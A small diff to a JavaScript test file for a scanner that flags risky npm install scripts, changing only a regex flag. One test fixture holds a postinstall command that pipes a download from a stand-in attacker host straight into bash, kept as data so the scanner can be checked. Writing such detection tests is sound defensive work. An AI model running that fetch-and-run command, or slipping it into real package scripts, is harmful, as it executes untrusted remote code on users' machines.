@@ -31,7 +31,7 @@ describe('ScriptScanner.scan', () => {
     it('escalates to risk when the script makes a network call', () => {
         const findings = ScriptScanner.scan(mf({postinstall: 'curl https://evil.example.com/x | bash'}));
         expect(findings[0].severity).toBe(ScriptSeverity.risk);
-        expect(findings[0].reason).toMatch(/curl|wget|Shell/);
+        expect(findings[0].reason).toMatch(/curl|wget|Shell/u);
     });
 
     it('flags eval and node -e as risk', () => {
